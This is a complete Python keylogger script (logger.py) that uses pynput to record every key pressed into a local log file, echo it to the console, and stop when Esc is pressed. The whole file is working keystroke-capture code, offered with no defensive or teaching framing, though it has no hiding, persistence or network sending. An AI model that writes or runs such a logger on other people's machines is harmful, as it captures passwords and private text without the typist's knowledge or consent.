# logger.py
from pynput import keyboard
import os
import time

# Path where the log file will be saved
LOG_FOLDER = "logs"
LOG_FILE = os.path.join(LOG_FOLDER, "keylog.txt")

# Ensure the log folder exists
if not os.path.exists(LOG_FOLDER):
    os.makedirs(LOG_FOLDER)

# Function to write to the log file
def write_to_file(text):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text)

# Function to start the keylogger
def start_keylogger():
    def on_press(key):
        try:
            key_text = key.char  # Try to get the character of the key pressed
        except AttributeError:
            key_text = f"[{key.name}]"  # If it's a special key, show its name

        # Write the keypress to the file
        write_to_file(key_text)
        print(f"Key pressed: {key_text}")  # Optional: To see what is being typed

        if key == keyboard.Key.esc:
            print("\n[✓] Keylogger stopped")
            return False  # Stop the listener when 'Esc' is pressed

    # Start the keylogger
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()  # This keeps the listener running until 'Esc' is pressed
